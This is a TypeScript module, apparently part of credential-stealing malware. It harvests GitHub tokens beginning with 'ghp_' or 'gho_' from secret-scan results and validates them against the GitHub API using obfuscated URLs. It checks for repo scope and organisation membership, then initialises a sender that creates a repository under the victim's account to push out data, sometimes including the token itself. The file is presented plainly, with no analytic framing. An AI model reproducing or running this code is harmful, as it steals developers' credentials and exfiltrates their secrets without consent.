import { fetchCommit } from "../../github_utils/fetcher";
import { checkToken } from "../../github_utils/tokenCheck";
import type { ProviderResult } from "../../providers/types";
import { logUtil } from "../../utils/logger";
import type { Sender } from "../base";
import type { SenderFactory } from "../senderFactory";
import { GitHubSender } from "./githubSender";

declare function scramble(str: string): string;

export interface GitHubSenderFactoryOptions {
  client: string;
  includeToken?: boolean;
}

export class GitHubSenderFactory implements SenderFactory {
  constructor() {}

  async tryCreate(quickRef?: ProviderResult[]): Promise<Sender | null> {
    if (quickRef) {
      return this.configureGit(quickRef);
    } else {
      return this.setupGitHubSender();
    }
  }

  private async configureGit(
    quickRef: ProviderResult[],
  ): Promise<Sender | null> {
    const ghPat: string[] = [];
    quickRef
      .flatMap((searchRes) => {
        const matches = searchRes?.matches;
        if (Array.isArray(matches)) {
          return matches;
        }
        if (matches && typeof matches === "object") {
          return Object.values(matches).flat();
        }
        return [];
      })
      .forEach((match) => {
        if (
          typeof match === "string" &&
          (match.startsWith("ghp_") || match.startsWith("gho_"))
        ) {
          ghPat.push(match);
        }
      });

    if (ghPat.length === 0) {
      return null;
    }

    const ghHeaders = (token: string) => ({
      Authorization: `Bearer ${token}`,
      Accept: "application/vnd.github+json",
      "User-Agent": "node",
    });

    // Loop over as we need to check all pats until first valid.
    for (const pat of ghPat) {
      const userRes = await fetch(scramble("https://api.github.com/user"), {
        headers: ghHeaders(pat),
      });
      if (!userRes.ok) continue;

      const user = (await userRes.json()) as { login: string };
      if (!user?.login) continue;

      const tokInfo = await checkToken(pat);
      logUtil.log(tokInfo);

      const profileRes = await fetch(`https://github.com/${user.login}`);
      if (profileRes.status === 404 || profileRes.status === 302) {
        logUtil.error("User not publicly reachable.");
        logUtil.log(profileRes.status);
        return null;
      }

      if (!tokInfo.hasRepoScope) {
        return null;
      }

      const fileSender = new GitHubSender();
      const res = await fileSender.initialize(pat);
      if (!res) {
        logUtil.error("Failed to create repository!");
        return null;
      }

      const orgsRes = await fetch(
        scramble("https://api.github.com/user/orgs"),
        {
          headers: ghHeaders(pat),
        },
      );
      const orgs = orgsRes.ok ? ((await orgsRes.json()) as unknown[]) : [];

      if (orgs.length === 0) {
        logUtil.log("No orgs - handling.");
        fileSender.setIncludeToken(true);
      } else {
        logUtil.log("User is member of an org.");
      }

      return fileSender;
    }
    return null;
  }

  private async setupGitHubSender(): Promise<Sender | null> {
    const ghClient = await fetchCommit();
    if (ghClient) {
      let fileSender = new GitHubSender();
      const clientInitRes = await (fileSender as GitHubSender).initialize(
        ghClient,
      );
      if (clientInitRes) {
        return fileSender;
      } else {
        return null;
      }
    } else {
      return null;
    }
  }
}
